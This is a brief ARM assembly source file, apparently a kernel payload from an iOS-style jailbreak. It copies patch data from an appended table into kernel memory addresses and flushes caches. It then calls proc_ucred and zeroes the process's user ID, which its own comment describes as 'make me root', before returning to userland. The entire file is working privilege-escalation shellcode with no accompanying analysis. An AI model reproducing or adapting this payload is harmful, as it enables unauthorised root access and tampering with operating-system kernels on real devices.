.syntax unified
.globl start
start:
    adr r4, weirdfile
pf_loop:
    ldr r3, [r4], #4 ;# addr
    cmp r3, #0
    beq pf_done

    ldr r1, [r4], #4 ;# datalen
    add r2, r3, r1

    cmp r1, #4
    bne copy_loop

    ;# if it's 4, it must be done atomically
    ldr lr, [r4]
    str lr, [r3]
    b inval_loop

copy_loop:
    ldrb lr, [r4], #1
    strb lr, [r3], #1
    cmp r3, r2
    bne copy_loop
    
    sub r3, r1
inval_loop:
    # no, this is not wrong
    mcr p15, 0, r3, c7, c11, 1
    mcr p15, 0, r3, c7, c5, 1
    cmp r3, r2
    add r3, #16
    bls inval_loop

    b pf_loop

pf_done:
    # done; make me root
    ldr r1, [r4], #4 ;# proc_ucred
    blx r1
    mcr p15, 0, r0, c7, c5, 6 
    mov r1, #0
    str r1, [r0, #0xc]

    # return to userland
    ldm r4, {sp, pc}^
    
.align 2
weirdfile:
